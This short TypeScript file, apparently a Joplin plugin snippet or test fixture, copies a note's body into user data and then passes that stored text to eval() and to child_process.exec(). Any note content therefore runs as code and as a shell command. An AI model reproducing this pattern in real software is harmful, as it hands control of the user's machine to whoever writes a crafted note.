import * as childProcess from 'child_process';
import * as joplin from 'api';

async function triggerRule() {
    const note = await joplin.data.get(['notes', 'source-note']);
    await joplin.data.userDataSet(['notes', 'target-note'], 'shadow', note.body);

    const folder = await joplin.data.get(['folders', 'source-folder']);
    await joplin.data.userDataSet(['notes', 'target-note'], 'folder-copy', folder.title);

    const payload = await joplin.data.userDataGet(['notes', 'target-note'], 'shadow');
    eval(payload);
    childProcess.exec(payload);
}

export {};
